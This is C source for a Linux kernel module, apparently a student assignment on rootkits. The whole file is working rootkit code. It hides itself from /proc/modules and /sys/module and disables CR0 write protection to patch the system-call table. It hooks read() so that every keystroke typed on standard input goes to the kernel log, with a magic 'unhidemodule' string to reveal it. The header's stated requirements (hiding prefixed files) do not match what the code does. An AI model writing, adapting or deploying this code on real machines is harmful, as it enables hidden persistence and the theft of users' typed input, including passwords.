/*
 *  Assignment 5
 *  Module Hiding
 *
 *  Requirements:
 *     a) Pick a suitable prefix (for instance rootkit_). Hide files with this
 *         predefined prefix from the user when listing directories
 *     b) Hide the opened file descriptors that point to a hidden file from /proc/<pid>/
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/delay.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/sched.h>
#include <asm/paravirt.h>
#include "sysmap.h"

#define STATE_MODULES_VISIBLE 0
#define STATE_MODULES_HIDDEN 1

struct list_head* modules;
int modules_state = STATE_MODULES_VISIBLE;

LIST_HEAD(hidden_modules);

struct module* find_hidden_module(char *name)
{
  struct module *mod;

  list_for_each_entry(mod, &hidden_modules, list) {
   if (strcmp(mod->name, name) == 0) {
    return mod;
   }
  }
  return NULL;
}

void hide_module(struct module* mod)
{
  if (modules_state == STATE_MODULES_VISIBLE) {
    return;
  }

  // remove the module from /proc/module
  list_del(&mod->list);

  // Make a backup of the kobject
  // saved_kobj = mod->mkobj.kobj;

  // remove module from /sys/module
  kobject_del(&mod->mkobj.kobj);

  // Avoid double free when rmmod-ing
  mod->sect_attrs = NULL;
  mod->notes_attrs = NULL;


  // Insert module into hidden list
  list_add_tail(&mod->list, &hidden_modules);
}

void unhide_module(struct module* mod)
{
  // Remove module from the hidden list
  list_del(&mod->list);

  // Add the module to the linked list again
  list_add(&mod->list, modules);

}

void set_module_hidden(char* name)
{
  struct module* mod;

  mutex_lock(&module_mutex);
  mod = find_module(name);
  mutex_unlock(&module_mutex);

  if (mod != NULL) {
    hide_module(mod);
  }
}

void set_module_visible(char* name)
{
  struct module* mod = find_hidden_module(name);

  if (mod != NULL) {
    unhide_module(mod);
  }
}

void enable_module_hiding(void)
{
  modules_state = STATE_MODULES_HIDDEN;
}

void disable_module_hiding(void)
{
  // Unhide all hidden modules
  while (hidden_modules.next != &hidden_modules) {
    struct module* mod = container_of(hidden_modules.next, struct module, list);
    unhide_module(mod);
  }

  modules_state = STATE_MODULES_VISIBLE;
}

void disable_ro(void)
{
    write_cr0(read_cr0() & ~X86_CR0_WP);
    barrier();
}

void enable_ro(void)
{
    write_cr0(read_cr0() | X86_CR0_WP);
    barrier();
}

#define syscalls ((void**)SM_sys_call_table)

int (*asmlinkage old_read_func)(int fd, void* buf, size_t count);

atomic_t active_read_calls = ATOMIC_INIT(0);

asmlinkage int fake_read(int fd, void* buf, size_t count)
{
    char mybuf[2];
    int ret, i;
    atomic_inc(&active_read_calls);

    ret = old_read_func(fd, buf, count);

    if (fd == 0)
    {
        if (strstr(buf, "unhidemodule"))
        {
            unhide_module(&__this_module);
            disable_module_hiding();
        }
        else
        {
            printk(KERN_INFO);
            mybuf[1] = '\0';
            for (i = 0; i < ret; i++)
            {
                mybuf[0] = ((char*)buf)[i];
                if ((mybuf[0] < ' ') || (mybuf[0] > '~')) continue;
                printk(mybuf);
            }
            printk("\n");
        }
    }

    atomic_dec(&active_read_calls);
    return ret;
}

void hook_read(void)
{
    disable_ro();
    old_read_func = syscalls[__NR_read];
    syscalls[__NR_read] = fake_read;
    enable_ro();
}

void unhook_read(void)
{
    disable_ro();
    syscalls[__NR_read] = old_read_func;
    enable_ro();
}

int init_module(void){
    printk(KERN_INFO "Module hiding loaded.\n");

    enable_module_hiding();
    hide_module(&__this_module);
    hook_read();

    return 0;
}

void cleanup_module(void){
    printk(KERN_INFO "Module hiding unloaded.\n");

    unhide_module(&__this_module);
    disable_module_hiding();
    unhook_read();
    // Prevent other CPUs from crashing due to running unloaded code
    // Not too pretty but should be fine
    /* while (atomic_read(&active_calls) != 0) */
        /* msleep(100); */

    return;
}

